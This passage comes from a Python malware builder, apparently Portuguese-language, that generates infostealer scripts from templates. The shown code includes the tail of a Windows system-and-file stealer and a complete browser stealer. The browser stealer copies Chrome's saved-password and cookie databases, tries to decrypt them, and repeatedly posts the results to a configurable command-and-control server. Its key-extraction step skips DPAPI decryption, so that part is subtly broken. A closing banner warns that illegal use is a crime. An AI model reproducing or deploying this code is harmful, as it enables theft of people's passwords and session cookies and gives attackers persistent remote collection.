            requests.post(self.c2_server, json=data, timeout=10)
        except:
            pass
    
    def run(self):
        while True:
            system_info = self.collect_system_info()
            sensitive_files = self.collect_sensitive_files()
            
            data = {{
                "system_info": system_info,
                "sensitive_files": sensitive_files
            }}
            
            self.send_to_c2(data)
            time.sleep(self.interval)

if __name__ == "__main__":
    stealer = WindowsStealer()
    stealer.run()"""

    def gerar_browser_stealer(self, c2_server: str, intervalo: int, **kwargs) -> str:
        return f"""import os
import sqlite3
import requests
import json
import time
import base64
from Crypto.Cipher import AES
import shutil
import tempfile

class BrowserStealer:
    def __init__(self):
        self.c2_server = "{c2_server}"
        self.interval = {intervalo} * 60
        
    def get_chrome_passwords(self):
        passwords = []
        try:
            # Local do banco de dados do Chrome
            login_db = os.path.join(os.getenv('LOCALAPPDATA'), 
                                  'Google\\Chrome\\User Data\\Default\\Login Data')
            
            # Copiar arquivo para evitar bloqueio
            temp_dir = tempfile.gettempdir()
            temp_db = os.path.join(temp_dir, 'chrome_temp.db')
            shutil.copy2(login_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                # Tentar descriptografar a senha
                try:
                    key = self.get_encryption_key()
                    cipher = AES.new(key, AES.MODE_GCM, encrypted_password[3:15])
                    decrypted = cipher.decrypt(encrypted_password[15:-16]).decode()
                    passwords.append({{"url": url, "username": username, "password": decrypted}})
                except:
                    passwords.append({{"url": url, "username": username, "password": "ENCRYPTED"}})
            
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            pass
        return passwords
    
    def get_encryption_key(self):
        try:
            local_state_path = os.path.join(os.getenv('LOCALAPPDATA'),
                                         'Google\\Chrome\\User Data\\Local State')
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
            
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remover prefixo DPAPI
            return encrypted_key
        except:
            return None
    
    def get_chrome_cookies(self):
        cookies = []
        try:
            cookie_db = os.path.join(os.getenv('LOCALAPPDATA'),
                                   'Google\\Chrome\\User Data\\Default\\Network\\Cookies')
            
            temp_dir = tempfile.gettempdir()
            temp_db = os.path.join(temp_dir, 'chrome_cookies.db')
            shutil.copy2(cookie_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            
            key = self.get_encryption_key()
            
            for row in cursor.fetchall():
                host = row[0]
                name = row[1]
                encrypted_value = row[2]
                
                try:
                    cipher = AES.new(key, AES.MODE_GCM, encrypted_value[3:15])
                    decrypted = cipher.decrypt(encrypted_value[15:-16]).decode()
                    cookies.append({{"host": host, "name": name, "value": decrypted}})
                except:
                    cookies.append({{"host": host, "name": name, "value": "ENCRYPTED"}})
            
            conn.close()
            os.remove(temp_db)
        except:
            pass
        return cookies
    
    def send_to_c2(self, data):
        try:
            requests.post(self.c2_server, json=data, timeout=10)
        except:
            pass
    
    def run(self):
        while True:
            passwords = self.get_chrome_passwords()
            cookies = self.get_chrome_cookies()
            
            if passwords or cookies:
                self.send_to_c2({{
                    "passwords": passwords,
                    "cookies": cookies
                }})
            
            time.sleep(self.interval)

if __name__ == "__main__":
    stealer = BrowserStealer()
    stealer.run()"""

    def _sair(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        gerador = GeradorPayloadsElite()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
